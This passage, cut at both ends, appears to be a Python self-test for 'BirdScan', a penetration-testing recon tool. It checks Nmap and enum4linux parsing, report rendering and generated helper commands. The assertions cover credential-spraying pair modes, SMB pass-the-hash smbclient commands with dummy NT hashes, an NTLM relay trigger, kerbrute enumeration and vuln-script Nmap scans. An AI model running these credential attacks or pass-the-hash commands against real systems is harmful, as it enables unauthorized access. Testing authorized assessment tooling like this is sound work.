            service="rdp",
            title="nmap rdp scripts",
            description="RDP metadata collected.",
            command="nmap -Pn -p 3389 --script rdp-enum-encryption 10.10.10.30",
            raw_output_file=relpath(rdp_raw_one, state.output_dir),
        ),
        Evidence(
            category="rdp",
            ip="10.10.10.31",
            port=3391,
            service="rdp",
            title="nmap rdp scripts",
            description="RDP metadata collected.",
            command="nmap -Pn -p 3391 --script rdp-enum-encryption 10.10.10.31",
            raw_output_file=relpath(rdp_raw_two, state.output_dir),
        ),
        Evidence(
            category="ad",
            ip="10.10.10.30",
            port=None,
            service="dns",
            title="Reverse DNS name discovered through AD DNS",
            description="rdp.internal.local",
            raw_output_file=relpath(rdp_raw_one, state.output_dir),
        ),
    ]
    rdp_filtered_evidence = [item for item in rdp_group_evidence if evidence_matches_service_group(item, "RDP", rdp_group_services)]
    rdp_grouped_html = enumeration_details_block(rdp_filtered_evidence, state, title="Informações de Enumeração do Grupo")
    rdp_raw_inline_html = raw_details_for_evidence(rdp_group_evidence[0], state)
    host_only_state = ScanState(run_id="host-only", started_at="", output_dir=str(output_dir))
    parse_nmap_normal(
        "\n".join(
            [
                "Nmap scan report for ping-only.internal.local (10.10.10.95)",
                "Host is up (0.001s latency).",
                "Nmap done: 1 IP address (1 host up) scanned in 0.10 seconds",
            ]
        ),
        host_only_state,
        "sn-normal",
    )
    parse_nmap_gnmap("Host: 10.10.10.96 (gnmap-only.internal.local)\tStatus: Up\n", host_only_state, "sn-gnmap")
    parse_nmap_xml(
        """<?xml version="1.0" encoding="UTF-8"?>
<nmaprun scanner="nmap">
  <host>
    <status state="up"/>
    <address addr="10.10.10.97" addrtype="ipv4"/>
    <hostnames><hostname name="xml-only.internal.local" type="PTR"/></hostnames>
  </host>
</nmaprun>
""",
        host_only_state,
        "sn-xml",
    )
    merge_state = ScanState(run_id="merge", started_at="", output_dir=str(output_dir))
    parse_nmap_normal(
        "\n".join(
            [
                "Nmap scan report for sparse.internal.local (10.10.10.98)",
                "Host is up (0.001s latency).",
                "PORT     STATE SERVICE",
                "8080/tcp open  http-proxy",
                "",
            ]
        ),
        merge_state,
        "sparse-normal",
    )
    parse_nmap_xml(
        """<?xml version="1.0" encoding="UTF-8"?>
<nmaprun scanner="nmap">
  <host>
    <status state="up"/>
    <address addr="10.10.10.98" addrtype="ipv4"/>
    <hostnames><hostname name="rich.internal.local" type="PTR"/></hostnames>
    <ports>
      <port protocol="tcp" portid="8080">
        <state state="open"/>
        <service name="http" product="nginx" version="1.28.3" extrainfo="reverse proxy"/>
      </port>
    </ports>
  </host>
</nmaprun>
""",
        merge_state,
        "rich-xml",
    )
    merged_service = merge_state.find_service("10.10.10.98", 8080)
    known_service = ServiceRecord(ip="10.10.10.99", port=3306, service="mysql", source="sparse")
    merge_service(known_service, ServiceRecord(ip="10.10.10.99", port=3306, service="unknown", source="weak"))

    users_fixture = fixture_dir / "users.txt"
    users_fixture.write_text("alice\nbob\n", encoding="utf-8")
    passwords_fixture = fixture_dir / "passwords.txt"
    passwords_fixture.write_text("pass1\npass2\n", encoding="utf-8")
    pitchfork_args = argparse.Namespace(username_file=str(users_fixture), password_file=str(passwords_fixture), username=None, password=None, auth_attack_mode="pitchfork", ntlm_hash=None)
    pitchfork_pairs, pitchfork_mode = build_credential_pairs(pitchfork_args)
    cluster_args = argparse.Namespace(username_file=str(users_fixture), password_file=str(passwords_fixture), username=None, password=None, auth_attack_mode="clusterbomb", ntlm_hash=None)
    cluster_pairs, cluster_mode = build_credential_pairs(cluster_args)
    single_user_args = argparse.Namespace(username="admin", password=None, username_file=None, password_file=str(passwords_fixture), auth_attack_mode="auto", ntlm_hash=None)
    single_user_pairs, single_user_mode = build_credential_pairs(single_user_args)
    single_pass_args = argparse.Namespace(username=None, password="Winter2024!", username_file=str(users_fixture), password_file=None, auth_attack_mode="auto", ntlm_hash=None)
    single_pass_pairs, single_pass_mode = build_credential_pairs(single_pass_args)
    order_fixture = fixture_dir / "order-users.txt"
    order_fixture.write_text("zeta\nalpha\nzeta\n", encoding="utf-8")
    order_users = collect_credential_usernames(argparse.Namespace(username=None, username_file=str(order_fixture), password=None, password_file=None))
    pitchfork_uneven_args = argparse.Namespace(username_file=str(order_fixture), password_file=str(passwords_fixture), username=None, password=None, auth_attack_mode="pitchfork", ntlm_hash=None)
    pitchfork_uneven_pairs, _ = build_credential_pairs(pitchfork_uneven_args)

    enum4linux_fixture = """
[+] Getting builtin groups:
group:[Administrators] rid:[0x220]
[+] Getting local groups:
group:[Backup Operators] rid:[0x227]
[+] Getting domain groups:
group:[Domain Admins] rid:[0x200]
user:[alice] rid:[0x3e8]
S-1-5-21-1-1001 ACME\\bob (Domain User)
S-1-5-21-1-1002 ACME\\Helpdesk (Local Group)
Group: 'Domain Admins' (RID: 512) has member: ACME\\alice
//10.10.10.60/backups Mapping: OK Listing: OK Writing: OK
//10.10.10.60/files Mapping: DENIED Listing: N/A Writing: N/A
"""
    parsed_enum4linux = parse_enum4linux_output(enum4linux_fixture)
    denied_smb_output = "tree connect failed: NT_STATUS_ACCESS_DENIED\n"
    allowed_smb_output = "Domain=[ACME] OS=[Windows Server]\n"
    denied_share_result = CommandResult([], [], 0, denied_smb_output, "", 0.0, None)
    allowed_share_result = CommandResult([], [], 0, "  .                                   D        0  2024-01-01\n", "", 0.0, None)
    denied_permission_row = {"mapping": "DENIED", "permissions": ["ACCESS DENIED"]}
    allowed_permission_row = {"mapping": "OK", "permissions": ["ACCESS", "VIEW", "READ"]}
    smb_matrix_args = argparse.Namespace(
        username="alice",
        username_file=None,
        password="Password!",
        password_file=None,
        ntlm_hash="0123456789abcdef0123456789abcdef",
        ntlm_hash_file=None,
        domain="ACME",
    )
    smb_matrix = direct_smb_credentials(smb_matrix_args)
    smb_matrix_methods = {(item["domain"], item["method"]) for item in smb_matrix}

    smb_auth_state = ScanState(run_id="smb-auth", started_at="", output_dir=str(output_dir))
    smb_auth_state.services = [
        ServiceRecord(ip="10.10.10.60", port=139, service="netbios-ssn", product="Samba", version="4.19"),
        ServiceRecord(ip="10.10.10.60", port=445, service="microsoft-ds", product="Samba", version="4.19"),
    ]
    for test_port in (139, 445):
        smb_auth_state.evidence.append(
            Evidence(
                category="smb",
                ip="10.10.10.60",
                port=test_port,
                service="smb",
                title="SMB shares visible anonymously",
                description="Anonymous share listing accepted.",
                data={
                    "auth_result": "accepted",
                    "auth_method": "anonymous",
                    "username": "",
                    "shares": [{"name": "backups", "permissions": ["VISIBLE"]}],
                },
            )
        )
    smb_auth_state.evidence.extend(
        [
            Evidence(
                category="smb",
                ip="10.10.10.60",
                port=445,
                service="smb",
                title="Auth accepted: analyst",
                description="accepted",
                data={"auth_result": "accepted", "auth_method": "password", "username": "analyst", "password": "Pa:ss#)!", "domain": "ACME"},
            ),
            Evidence(
                category="smb",
                ip="10.10.10.60",
                port=445,
                service="smb",
                title="Auth accepted: admin hash",
                description="accepted",
                data={"auth_result": "accepted", "auth_method": "ntlm-hash", "username": "admin", "ntlm_hash": "0123456789abcdef:0123456789abcdef0123456789abcdef", "domain": "ACME"},
            ),
        ]
    )
    smb_auth_state.evidence.append(
        Evidence(
            category="smb",
            ip="10.10.10.60",
            port=445,
            service="smb",
            title="Acesso SMB por usuário — ACME\\admin (NT hash)",
            description="Acesso efetivo validado com smbclient.",
            data={
                "credential_label": "ACME\\admin (NT hash)",
                "username": "admin",
                "domain": "ACME",
                "auth_method": "hash",
                "shares": [
                    {
                        "name": "backups",
                        "permissions": ["ACCESS", "VIEW"],
                        "listing_success": True,
                        "mounted": False,
                        "path": "",
                        "interaction_command": "smbclient //10.10.10.60/backups -p 445 -U ACME/admin --pw-nt-hash --password 0123456789abcdef0123456789abcdef",
                    }
                ],
            },
        )
    )
    smb_auth_commands = flatten_cmds(service_primary_commands_by_tool(smb_auth_state.services[1], smb_auth_state))
    smb_interaction_html = service_interaction_buttons(smb_auth_state.services[1], smb_auth_state)
    preferred_smb = preferred_smb_services(smb_auth_state)

    kerberos_state = ScanState(run_id="kerberos-auth", started_at="", output_dir=str(output_dir))
    kerberos_state.hosts["10.10.10.40"] = HostRecord(ip="10.10.10.40", domain="ACME.LOCAL")
    kerberos_state.services = [
        ServiceRecord(ip="10.10.10.40", port=88, service="kerberos"),
        ServiceRecord(ip="10.10.10.40", port=445, service="microsoft-ds"),
    ]
    kerberos_state.evidence.extend(
        [
            Evidence(category="kerberos", ip="10.10.10.40", port=88, service="kerberos", title="kerbrute userenum", description="Valid users found.", data={"valid_users": ["alice", "bob"]}),
            Evidence(
                category="smb",
                ip="10.10.10.40",
                port=445,
                service="smb",
                title="Auth accepted: alice",
                description="accepted",
                data={"auth_result": "accepted", "auth_method": "password", "username": "alice", "password": "P@ss:#)", "domain": "ACME.LOCAL"},
            ),
        ]
    )
    kerberos_test_commands = flatten_cmds(service_primary_commands_by_tool(kerberos_state.services[0], kerberos_state))
    kerberos_users_html = kerberos_service_group_table([kerberos_state.services[0]], {}, kerberos_state)

    mixed_auth_args = argparse.Namespace(
        username="alice",
        password="Password!",
        username_file=None,
        password_file=None,
        ntlm_hash="0123456789abcdef0123456789abcdef",
        ntlm_hash_file=None,
        domain="ACME",
        auth_attack_mode="pitchfork",
    )
    mixed_auth_pairs, mixed_auth_mode = build_credential_pairs(mixed_auth_args)
    raw_slug_variants = {
        credential_pair_slug(CredentialPair("alice", secret, False, "ACME"))
        for secret in ("a!b", "a@b")
    }
    scope_web_only = argparse.Namespace(web_only=True, skip_service_enum=False)
    scope_skip_services = argparse.Namespace(web_only=False, skip_service_enum=True)
    reauth_hash_file = fixture_dir / "reauth-hashes.txt"
    reauth_hash_file.write_text("0123456789abcdef0123456789abcdef\n", encoding="utf-8")
    reauth_args = build_arg_parser().parse_args(
        ["--resume", str(state.output_dir), "--reauth-only", "--ntlm-hash-file", str(reauth_hash_file), "--no-auto-install"]
    )
    reauth_hash_file_valid = True
    try:
        validate_cli_file_paths(reauth_args)
    except BirdScanUsageError:
        reauth_hash_file_valid = False

    non_equivalent_smb_state = ScanState(run_id="smb-non-equivalent", started_at="", output_dir=str(output_dir))
    non_equivalent_smb_state.services = [
        ServiceRecord(ip="10.10.10.61", port=139, service="netbios-ssn", product="Samba", version="4"),
        ServiceRecord(ip="10.10.10.61", port=445, service="microsoft-ds", product="Windows", version="2022"),
    ]
    non_equivalent_smb_state.evidence.append(
        Evidence(
            category="smb",
            ip="10.10.10.61",
            port=139,
            service="smb",
            title="Auth accepted: alice",
            description="accepted",
            data={"auth_result": "accepted", "auth_method": "password", "username": "alice", "password": "Pass!", "domain": "ACME"},
        )
    )
    non_equivalent_targets = smb_enum_credentials_by_endpoint(non_equivalent_smb_state)
    non_equivalent_mount_names = {
        smb_mapping_directory_name(
            "10.10.10.61",
            port,
            credential,
            2,
        )
        for (target_ip, port), (_, credentials) in [
            (("10.10.10.61", 139), (non_equivalent_smb_state.services[0], [{"username": "alice", "password": "Pass!", "domain": "ACME", "method": "password"}])),
            (("10.10.10.61", 445), (non_equivalent_smb_state.services[1], [{"username": "alice", "password": "Pass!", "domain": "BETA", "method": "password"}])),
        ]
        for credential in credentials
    }
    kerberos_wrong_realm_state = ScanState(run_id="kerberos-realm", started_at="", output_dir=str(output_dir))
    kerberos_wrong_realm_state.hosts["10.10.10.62"] = HostRecord(ip="10.10.10.62", domain="A.LOCAL")
    kerberos_wrong_realm_state.evidence.append(
        Evidence(
            category="smb",
            ip="10.10.10.62",
            port=445,
            service="smb",
            title="Auth accepted: alice",
            description="accepted",
            data={"auth_result": "accepted", "auth_method": "password", "username": "alice", "password": "Pass!", "domain": "A.LOCAL"},
        )
    )
    kerberos_wrong_realm_credentials = validated_kerberos_credentials(kerberos_wrong_realm_state, "10.10.10.62", "B.LOCAL")

    checks = [
        ("hosts", len(state.hosts) == 5, f"expected 5 hosts, got {len(state.hosts)}"),
        ("services", len(state.services) == 7, f"expected 7 services, got {len(state.services)}"),
        ("default-nmap", default_nmap_command[:11] == ["sudo", "nmap", "--open", "-Pn", "-p-", "-sV", "-sC", "-O", "--version-all", "--script", "vuln"], "default Nmap command changed unexpectedly"),
        ("nmap-profiles-differ", len({tuple(command) for command in profile_nmap_commands.values()}) == 4, "Nmap profiles should generate distinct commands"),
        ("nmap-profile-top-ports", "--top-ports" in profile_nmap_commands["safe"] and "1000" in profile_nmap_commands["safe"] and "500" in profile_nmap_commands["fast"] and "2000" in profile_nmap_commands["balanced"] and "-p-" in profile_nmap_commands["deep"], "safe/fast/balanced/deep port scopes are incorrect"),
        ("ipv6-ip-port-import", len(ipv6_state.services) == 1 and ipv6_state.services[0].ip == "2001:db8::1" and ipv6_state.services[0].port == 443, "bracketed IPv6 IP:PORT input was not parsed correctly"),
        ("ipv6-nmap-flag", "-6" in ipv6_nmap_command, "IPv6 Nmap commands must include -6"),
        ("mixed-ip-sort", ["192.0.2.1", "2001:db8::1"] == sorted(["192.0.2.1", "2001:db8::1"], key=ip_sort_key), "mixed IPv4/IPv6 sorting must not raise or compare address classes"),
        ("custom-nmap-target-preserved", custom_nmap_targets == [custom_nmap_text] and not custom_nmap_warnings, "documented custom Nmap command should remain one validated target"),
        ("scope-web-only", not service_auth_workflow_enabled(scope_web_only) and service_auth_workflow_enabled(scope_skip_services), "web-only must suppress service auth while skip-service-enum must retain it"),
        ("reauth-hash-file", reauth_hash_file_valid, "reauth-only should accept --ntlm-hash-file"),
        ("web-roots-all-web-services", len(roots) == web_service_count and any(root.url == "http://10.10.10.50:8080/" for root in roots), "WEB roots were not generated from all WEB services"),
        ("web-root-priority-sum", len(root_prioritized) + len(root_other) == web_service_count, "prioritized + other WEB roots does not match WEB port count"),
        ("web-catalog-synthetic-roots", len(catalog) >= len(roots) and any(endpoint.status_code == 0 and endpoint.url.startswith("http://10.10.10.40") for endpoint in catalog), "WEB catalog did not include synthetic roots for WEB ports"),
        ("nmap-glob-import", nmap_glob_normal in glob_import_paths and nmap_glob_xml in glob_import_paths, "Nmap glob import did not resolve nmap* files"),
        ("nmap-glob-skips-junk", nmap_glob_junk not in glob_import_paths, "Nmap glob import should skip non-Nmap files"),
        ("nmap-empty-import-nonfatal", empty_import_ok, "valid Nmap output with no useful host/service data should not abort import"),
        ("nmap-host-only-normal", "10.10.10.95" in host_only_state.hosts and not host_only_state.services, "normal -sn output should import host-only data"),
        ("nmap-host-only-gnmap", "10.10.10.96" in host_only_state.hosts, "gnmap Status: Up output should import host-only data"),
        ("nmap-host-only-xml", "10.10.10.97" in host_only_state.hosts, "XML host without ports should import host-only data"),
        ("nmap-merge-rich-service", merged_service is not None and merged_service.product == "nginx" and "1.28.3" in merged_service.version and "sparse-normal" in merged_service.source and "rich-xml" in merged_service.source, "same IP:port across Nmap files should merge richer service data"),
        ("nmap-merge-keeps-known-service", known_service.service == "mysql" and "weak" in known_service.source, "unknown service name should not overwrite a useful known service"),
        ("nmap-multiple-cli-values", flattened_nmap_inputs == [str(nmap_glob_normal), str(nmap_glob_xml)], "multiple --from-nmap values were not flattened"),
        ("deep-fuzz-command", "-w" not in deep_command and "-m" in deep_command and "GET" in deep_command and "-f" in deep_command and DEEP_FUZZ_EXTENSIONS_CSV in deep_command, "deep-fuzz dirsearch command is not correct"),
        ("http-status-any-code-active", has_http_response(not_found_endpoint) and is_reportable_web_endpoint(not_found_endpoint), "HTTP 404 root should be treated as active/reportable"),
        ("screenshot-404-filter", not is_web_success(not_found_endpoint) and is_reportable_web_endpoint(not_found_endpoint), "HTTP 404 should stay reportable but not be treated as screenshot success"),
        ("active-roots-any-status", len(not_found_roots) == 1 and not_found_roots[0].url == "http://10.10.10.90:9090/", "active WEB roots should include any HTTP status"),
        ("dirsearch-parse-any-status", mixed_dirsearch_results == [(404, "http://10.10.10.90:9090/missing"), (500, "http://10.10.10.90:9090/error")], "dirsearch parser should preserve all HTTP status results"),
        ("non-interesting-no-evidence", len(state.evidence) == evidence_count_before, "non-interesting WEB endpoint generated evidence"),
        ("aliases", "app2.internal.local" in state.hosts["10.10.10.10"].aliases, "missing alias from repeated IP"),
        ("reason-not-service-detail", not any("syn-ack" in f"{service.product} {service.version} {service.banner}" for service in state.services), "Nmap REASON parsed as service detail"),
        ("xml-script-evidence", any(item.category == "web" and item.data.get("script_id") == "http-server-header" for item in state.evidence), "missing XML NSE HTTP evidence"),
        ("suppressed-nmap-risk", not any(is_suppressed_evidence(item) for item in state.evidence), "suppressed Nmap risk evidence leaked into state"),
        ("database-finding", any(item.title == "mysql open" for item in state.evidence), "missing DB exposure evidence"),
        ("rdp-finding", any(item.title == "RDP open" for item in state.evidence), "missing RDP exposure evidence"),
        ("ssh-finding", any(item.title == "SSH open" for item in state.evidence), "missing SSH exposure evidence"),
        ("report", report_path.exists() and report_path.stat().st_size > 1000, "report.html not generated"),
        ("sensitive-artifact-permissions", all((Path(state.output_dir) / name).stat().st_mode & 0o777 == 0o600 for name in ("report.html", "state.json", "results.json")), "credential-bearing report/state exports should be mode 0600"),
        ("host-tab", 'id="tab-hosts"' in report_text, "host grouping tab not generated"),
        ("service-tab", 'id="tab-service-groups"' in report_text, "service grouping tab not generated"),
        ("dashboard-fonts", "Urbanist" in report_text and "JetBrains Mono" in report_text, "dashboard font stack not rendered"),
        ("overview-pie-charts", "pie-donut" in report_text and "Serviços por Tipo" in report_text and "Status HTTP" in report_text, "overview pie charts not rendered"),
        ("overview-domains", "Domínios locais" in report_text and "internal.local" in report_text and report_text.find("Domínios locais") < report_text.find("Hosts catalogados"), "local domains not rendered first in quick map"),
        ("overview-bars", "Host x porta x quantidade" in report_text and "Top 10 serviços expostos" in report_text, "overview bar charts not rendered"),
        ("overview-charts-first", report_text.find("Gráficos de Superfície") < report_text.find("Mapa Rápido"), "overview charts should render before quick map"),
        ("attention-expand", "data-attention-toggle" in attention_test_html and "Mostrar mais" in attention_test_html, "attention list expansion not rendered"),
        ("no-severity-chart", "Evidências por severidade" not in report_text, "legacy severity chart should not be rendered"),
        ("web-service-full-catalog", "Catálogo WEB Completo" in report_text and "http://10.10.10.50:8080/api" in report_text, "WEB service view did not render full WEB catalog"),
        ("web-title-favicon", "Self Test Login" in report_text and "favicon-img" in report_text and "self-test.ico" in report_text, "WEB title/favicon not rendered"),
        ("enumeration-details", "Informações de Enumeração" in report_text and "enum-details" in report_text, "enumeration details block not rendered"),
        ("fuzz-commands", "gobuster dir -u http://10.10.10.50:8080/" in report_text and "feroxbuster --insecure --url http://10.10.10.50:8080/" in report_text and "dirsearch -u http://10.10.10.50:8080/" in report_text, "web fuzzing commands not generated"),
        ("catalog-status-groups", "Catálogo Web" in report_text and "web-status-group" in report_text, "WEB catalog status groups not rendered"),
        ("open-button", 'target="_blank" rel="noreferrer">Abrir</a>' in report_text, "Open button not rendered"),
        ("web-priority-sections-removed", "Endpoints WEB Priorizados" not in report_text and "Demais Endereços WEB" not in report_text, "WEB priority sections should not be rendered"),
        ("fuzz-ip-expandable", "web-fuzz-ip-section" in report_text and "web-fuzz-ip-row" in report_text, "Fuzzing by IP expandable rows not rendered"),
        ("redact-keeps-ports", "445" in redacted_port_command and "***" not in redacted_port_command, "redaction should not hide service ports"),
        ("redact-hides-secret-after-short-p", "***" in redacted_password_command and "secret" not in redacted_password_command, "redaction should hide explicit secrets after -p (if secrets list is provided)"),
        ("group-enum-noise-filter", is_group_enum_noise_evidence(group_noise_evidence) and not is_group_enum_noise_evidence(group_tool_evidence), "group enumeration should hide exposure-only noise and keep tool evidence"),
        ("group-enum-service-filter", len(rdp_filtered_evidence) == 2 and not any(item.category == "ad" for item in rdp_filtered_evidence), "service group enumeration should not include unrelated host-level AD/DNS evidence"),
        ("group-enum-separated-by-host", rdp_grouped_html.count('<details class="enum-item">') == 2 and "RDP output one" in rdp_grouped_html and "RDP output two" in rdp_grouped_html and "RAW agregado" not in rdp_grouped_html, "service group enumeration should keep RAW output separated by host"),
        ("group-raw-per-host-command", "10.10.10.30:3389" in rdp_grouped_html and "10.10.10.31:3391" in rdp_grouped_html and "Copiar comando" in rdp_grouped_html, "each host RAW block should retain its own command"),
        ("raw-inline", "raw-details" in rdp_raw_inline_html and "RDP output one" in rdp_raw_inline_html and "Copiar comando" in rdp_raw_inline_html, "RAW output should render inline with command copy action"),
        ("gobuster-single-command", len(gobuster_commands) == 1, "Gobuster copy button should contain one command"),
        ("ftp-copy-commands", any("ftp -inv -p 10.10.10.50 21" in command for command in ftp_commands.get("FTP anon", [])), "FTP anonymous command not generated as expected"),
        ("smb-port-commands", "backups" in " ".join(smb_auth_commands.get("SMBClient", [])) and "-p 445" in " ".join(smb_auth_commands.get("SMBClient", [])) and "-L" not in " ".join(smb_auth_commands.get("SMBClient", [])) and "--port 139" in " ".join(smb_commands.get("NXC", [])) and "-port 139" in " ".join(smb_commands.get("Impacket", [])), "SMB interaction must use validated share commands and retain the detected port in helper commands"),
        ("smb-signing-compact-false", parse_smb_keywords("SMB host (signing:False) (SMBv1:False)").get("smb_signing") is False, "compact signing:False output should be parsed as boolean false"),
        ("smb-signing-compact-true", parse_smb_keywords("SMB host (signing:True) (SMBv1:False)").get("smb_signing") is True, "compact signing:True output should be parsed as boolean true"),
        ("ntlm-relay-signing-false-only", "NTLM Relay ⚠️" in smb_signing_false_commands and "NTLM Relay ⚠️" not in smb_signing_true_commands, "NTLM Relay button must depend only on SMB signing=False"),
        ("ntlm-relay-legacy-signing-false", smb_signing_value_is_false("False) (SMBv1:True)") and not smb_signing_value_is_false("True) (SMBv1:True)"), "legacy scan states should preserve the signing=False button condition"),
        ("rdp-port-commands", "/v:10.10.10.30:3390" in " ".join(rdp_commands.get("XFreeRDP", [])) and "--port 3390" in " ".join(rdp_commands.get("NXC RDP", [])), "RDP commands do not carry the detected port"),
        ("ssh-port-command", "ssh -p 2222" in " ".join(ssh_commands.get("SSH", [])), "SSH command does not carry the detected port"),
        ("ldap-port-command", "ldaps://10.10.10.40:636" in " ".join(ldap_commands.get("LDAPSearch", [])) and "--port 636" in " ".join(ldap_commands.get("NXC LDAP", [])), "LDAP commands do not carry the detected port"),
        ("kerberos-not-ldap", "LDAPSearch" not in kerberos_commands and "krb5-info" in " ".join(kerberos_commands.get("KRB5 info", [])), "Kerberos commands should not render LDAP search commands"),
        ("mssql-port-command", "-port 1444" in " ".join(mssql_commands.get("MSSQL", [])) and "--port 1444" in " ".join(mssql_commands.get("MSSQL", [])), "MSSQL commands do not carry the detected port"),
        ("winrm-port-command", "-P 5986" in " ".join(winrm_commands.get("Evil-WinRM", [])) and "--port 5986" in " ".join(winrm_commands.get("NXC WinRM", [])), "WinRM commands do not carry the detected port"),
        ("group-actions-all-services", "10.10.10.30:3390" in group_action_html and "10.10.10.31:3391" in group_action_html and "XFreeRDP" in group_action_html, "service group actions do not include commands for every host:port"),
        ("generic-command-loop", "for cmd in" in generic_loop_text and 'sh -c "$cmd"' in generic_loop_text and "tee -a birdscan-commands-all.txt" in generic_loop_text and "echo" not in generic_loop_text, "multiple commands should be copied as a clean shell for-loop without echo decorations"),
        ("service-group-command-loop", "for cmd in" in group_action_html and 'nxc rdp 10.10.10.30 --port 3390' in group_action_html and "tee -a birdscan-nxc_rdp-all-targets.txt" in group_action_html and 'echo' not in service_tool_loop_command("NXC RDP", rdp_group_services, state), "service group multi-target commands should render as clean tool target loops"),
        ("service-group-loop-no-bad-bracket-pattern", '${ip#[}' not in group_action_html and '[ &quot;$proto&quot;' not in group_action_html, "service group loop should not render shell patterns that break on '['"),
        ("copy-ips-action", "Copiar IPs" in group_action_html and "10.10.10.30\n10.10.10.31" in group_action_html, "service group should include copy-only-IPs action"),
        ("gobuster-url-loop", "for url in" in gobuster_loop_command and 'gobuster dir -u "$url"' in gobuster_loop_command and gobuster_loop_command.count("gobuster dir -u") == 1 and "tee -a fuzzing-gobuster-all-web.txt" in gobuster_loop_command and "http://10.10.10.50:8080/" in gobuster_loop_command and "https://10.10.10.40/" in gobuster_loop_command and "echo" not in gobuster_loop_command, "global Gobuster command should loop over WEB roots without echo decorations"),
        ("fuzz-loop-simple-counter", "sed " not in gobuster_loop_command and "$slug" not in gobuster_loop_command and "count=" not in gobuster_loop_command, "global fuzzing loop should not use counters or slug parsing"),
        ("generic-nmap-version-command", "--version-all" in " ".join(generic_nmap_commands.get("Nmap Versão", [])) and "--reason" in " ".join(generic_nmap_commands.get("Nmap Versão", [])) and "Nmap NSE" in generic_nmap_commands, "generic service analysis commands not rendered"),
        ("bytes-label", endpoint_size_label(WebEndpoint(url="http://x/", ip="x", port=80, scheme="http", response_size=1234)) == "1234 bytes", "endpoint size label is not bytes"),
        ("dirsearch-parse", parse_dirsearch_results("[00:00:00] 200 - 123B - http://10.10.10.50:8080/admin") == [(200, "http://10.10.10.50:8080/admin")], "dirsearch parser did not extract URL/status"),
        ("json", (Path(state.output_dir) / "results.json").exists(), "results.json not generated"),
        ("csv", (Path(state.output_dir) / "services.csv").exists(), "services.csv not generated"),
        ("markdown", (Path(state.output_dir) / "summary.md").exists(), "summary.md not generated"),
        ("raw-copy", bool(list((Path(state.output_dir) / RAW_DIR / "nmap" / "imported").glob("*"))), "imported Nmap files not preserved"),
        ("auth-pitchfork-pairs", pitchfork_mode == "pitchfork" and pitchfork_pairs == [CredentialPair("alice", "pass1"), CredentialPair("bob", "pass2")], "pitchfork credential pairing failed"),
        ("auth-clusterbomb-pairs", cluster_mode == "clusterbomb" and len(cluster_pairs) == 4, "clusterbomb credential pairing failed"),
        ("auth-single-user-pairs", single_user_mode == "single-user" and single_user_pairs == [CredentialPair("admin", "pass1"), CredentialPair("admin", "pass2")], "single-user credential pairing failed"),
        ("auth-single-pass-pairs", single_pass_mode == "single-pass" and single_pass_pairs == [CredentialPair("alice", "Winter2024!"), CredentialPair("bob", "Winter2024!")], "single-pass credential pairing failed"),
        ("auth-list-order-preserved", order_users == ["zeta", "alpha", "zeta"], "credential list order or duplicates were modified"),
        ("auth-pitchfork-uneven-pairs", pitchfork_uneven_pairs == [CredentialPair("zeta", "pass1"), CredentialPair("alpha", "pass2")], "pitchfork should stop at the shorter list without modifying input order"),
        ("auth-pitchfork-password-and-hash", mixed_auth_mode == "pitchfork" and [pair.is_hash for pair in mixed_auth_pairs] == [False, True] and credential_pair_count(mixed_auth_args) == 2, "pitchfork should execute both password and hash for one user"),
        ("auth-pairs-streamed", not isinstance(iter_credential_pairs(mixed_auth_args), list), "credential pair generation should be lazy"),
        ("auth-raw-identity-slugs", len(raw_slug_variants) == 2, "RAW filenames must distinguish secrets that sanitize to the same slug"),
        ("nxc-auth-success-parse", nxc_auth_success("SMB 10.0.0.1 445 HOST [-] user bad\nSMB 10.0.0.1 445 HOST [+] user:pass") and not nxc_auth_success("SMB 10.0.0.1 445 HOST [-] user bad"), "nxc auth success parser failed"),
        ("smbv1-detect-nxc", detect_smbv1_enabled("SMB 10.0.0.1 445 HOST SMBv1:True"), "detect_smbv1_enabled should detect nxc SMBv1:True"),
        ("smbv1-detect-nmap", detect_smbv1_enabled("smb-protocols:\n  NT LM 0.12\n  2.0.2\n  3.0.2"), "detect_smbv1_enabled should detect NT LM 0.12 dialect"),
        ("smbv1-detect-false", not detect_smbv1_enabled("SMB 10.0.0.1 445 HOST SMBv1:False signing:True"), "detect_smbv1_enabled should return False when SMBv1 is disabled"),
        ("smbv1-parse-keywords", parse_smb_keywords("SMBv1:True signing: false")["smbv1_enabled"] is True and parse_smb_keywords("SMBv1:True signing: false")["severity"] == "high", "parse_smb_keywords should flag SMBv1 as high severity"),
        ("impacket-no-inputfile", all("-inputfile" not in cmd for cmd in smb_commands.get("Impacket", [])), "Impacket copy command should not use inputfile"),
        ("enum4linux-parser-users-groups", parsed_enum4linux.get("unscoped_users") == ["alice"] and parsed_enum4linux.get("domain_users") == ["bob"] and "Domain Admins" in parsed_enum4linux.get("domain_groups", []) and "Administrators" in parsed_enum4linux.get("local_groups", []), "enum4linux parser should not label unscoped users as AD"),
        ("enum4linux-parser-share-permissions", parsed_enum4linux.get("shares", [])[0].get("permissions") == ["ACCESS", "VIEW", "READ", "WRITE"] and parsed_enum4linux.get("shares", [])[1].get("permissions") == ["ACCESS DENIED"], "enum4linux parser should normalize share permissions"),
        ("smb-denied-tree-connect", smb_access_denied(denied_smb_output) and not smb_access_denied(allowed_smb_output), "SMB tree-connect denial must be detected before mapping"),
        ("smb-share-validation", not smb_share_access_succeeded(denied_share_result) and smb_share_access_succeeded(allowed_share_result), "share mapping must require a successful share-specific directory listing"),
        ("smb-credential-matrix", smb_matrix_methods == {("", "password"), ("", "hash"), ("ACME", "password"), ("ACME", "hash")}, "SMB mapping must test local/domain password and NT-hash combinations"),
        ("smb-denied-permission-row", smb_permission_denies_tree_connect(denied_permission_row) and not smb_permission_denies_tree_connect(allowed_permission_row), "enum4linux denied permissions must block mapping"),
        ("smb-prefers-445-when-identical", len(preferred_smb) == 1 and preferred_smb[0].port == 445, "identical SMB 139/445 endpoints should collapse to 445"),
        ("smb-keeps-non-equivalent-endpoint", set(non_equivalent_targets) == {("10.10.10.61", 139)}, "non-equivalent SMB endpoints must not move credentials to 445"),
        ("smb-mount-identity-isolated", len(non_equivalent_mount_names) == 2, "SMB mount directories must distinguish domains and endpoint identities"),
        ("kerberos-realm-isolated", not kerberos_wrong_realm_credentials, "credentials from another realm must not be reused for Kerberos"),
        ("smb-hash-classification", any(cred["method"] == "hash" for cred in detect_auth_credentials_from_evidence(smb_auth_state)[("10.10.10.60", 445)]), "NTLM hash evidence should remain classified as hash"),
        ("smbclient-hash-uses-nt-only", "--pw-nt-hash" in " ".join(smb_auth_commands.get("SMBClient", [])) and "0123456789abcdef0123456789abcdef" in " ".join(smb_auth_commands.get("SMBClient", [])), "smbclient PTH should pass only the NT component"),
